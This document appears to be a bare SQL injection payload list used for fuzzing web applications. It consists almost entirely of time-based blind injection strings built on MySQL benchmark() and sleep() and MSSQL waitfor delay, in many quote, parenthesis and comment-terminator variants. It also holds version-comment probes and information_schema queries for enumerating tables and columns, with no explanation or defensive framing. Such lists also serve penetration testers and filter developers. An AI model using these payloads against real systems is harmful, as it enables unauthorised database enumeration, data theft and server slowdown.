' if ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’
' if ASCII(SUBSTRING(‘Admin’,1,1)) = 65 waitfor delay ‘0:0:5’
' select if(user() like ‘root@%’, sleep(5000), ‘false’)
' select if(user() like ‘root@%’, benchmark(50000,sha1(‘test’)), ‘false’)
' SELECT cast(’1′ AS unsigned integer);
' SELECT cast(’123′ AS char);
' benchmark(10000000,MD5(1))#
' 1 or benchmark(10000000,MD5(1))#
' " or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
' 1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
") and 0=benchmark(3000000,MD5(1)) #
SELECT * FROM user WHERE id=("1") AND 0=benchmark(3000000,MD5(1)) # OR mid="1" #
sleep(__TIME__)#
1 or sleep(__TIME__)#
" or sleep(__TIME__)#
' or sleep(__TIME__)#
" or sleep(__TIME__)="
' or sleep(__TIME__)='
1) or sleep(__TIME__)#
") or sleep(__TIME__)="
') or sleep(__TIME__)='
1)) or sleep(__TIME__)#
")) or sleep(__TIME__)="
+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
and 0=benchmark(3000000,MD5(1))%20/*
and 0=benchmark(3000000,MD5(1))%20--
and 0=benchmark(3000000,MD5(1))%20%23
' and 0=benchmark(3000000,MD5(1))%20/*
' and 0=benchmark(3000000,MD5(1))%20--
' and 0=benchmark(3000000,MD5(1))%20%23
" and 0=benchmark(3000000,MD5(1))%20/*
" and 0=benchmark(3000000,MD5(1))%20--
" and 0=benchmark(3000000,MD5(1))%20%23
) and 0=benchmark(3000000,MD5(1))%20/*
) and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23
)) and 0=benchmark(3000000,MD5(1))%20/*
)) and 0=benchmark(3000000,MD5(1))%20--
)) and 0=benchmark(3000000,MD5(1))%20%23
))) and 0=benchmark(3000000,MD5(1))%20/*
))) and 0=benchmark(3000000,MD5(1))%20--
))) and 0=benchmark(3000000,MD5(1))%20%23
)))) and 0=benchmark(3000000,MD5(1))%20/*
)))) and 0=benchmark(3000000,MD5(1))%20--
)))) and 0=benchmark(3000000,MD5(1))%20%23
') and 0=benchmark(3000000,MD5(1))%20/*
') and 0=benchmark(3000000,MD5(1))%20--
') and 0=benchmark(3000000,MD5(1))%20%23
") and 0=benchmark(3000000,MD5(1))%20/*
") and 0=benchmark(3000000,MD5(1))%20--
") and 0=benchmark(3000000,MD5(1))%20%23
')) and 0=benchmark(3000000,MD5(1))%20/*
')) and 0=benchmark(3000000,MD5(1))%20--
')) and 0=benchmark(3000000,MD5(1))%20%23
")) and 0=benchmark(3000000,MD5(1))%20/*
")) and 0=benchmark(3000000,MD5(1))%20--
")) and 0=benchmark(3000000,MD5(1))%20%23
'))) and 0=benchmark(3000000,MD5(1))%20/*
'))) and 0=benchmark(3000000,MD5(1))%20--
'))) and 0=benchmark(3000000,MD5(1))%20%23
"))) and 0=benchmark(3000000,MD5(1))%20/*
"))) and 0=benchmark(3000000,MD5(1))%20--
"))) and 0=benchmark(3000000,MD5(1))%20%23
')))) and 0=benchmark(3000000,MD5(1))%20/*
')))) and 0=benchmark(3000000,MD5(1))%20--
')))) and 0=benchmark(3000000,MD5(1))%20%23
")))) and 0=benchmark(3000000,MD5(1))%20/*
")))) and 0=benchmark(3000000,MD5(1))%20--
")))) and 0=benchmark(3000000,MD5(1))%20%23
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
/*%20s*/
/*!%20s*/
/*!30000%20s*/
/*!40000%20s*/
/*!50000%20s*/
/*!40020%20s*/
/*!40017%20s*/
/*!40018%20s*/
SELECT IFNULL(1,0);
SELECT IFNULL(NULL,10);
SELECT IFNULL(1/0,10);
SELECT IFNULL(1/0,'yes');
SELECT NULLIF(1,1);
SELECT NULLIF(1,2);
SELECT IF((1 != 0), CAST(1*-1 as UNSIGNED), 1);
SELECT CAST(IF((1 != 0), 1*-1, 1) AS UNSIGNED);
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns  > 'A'
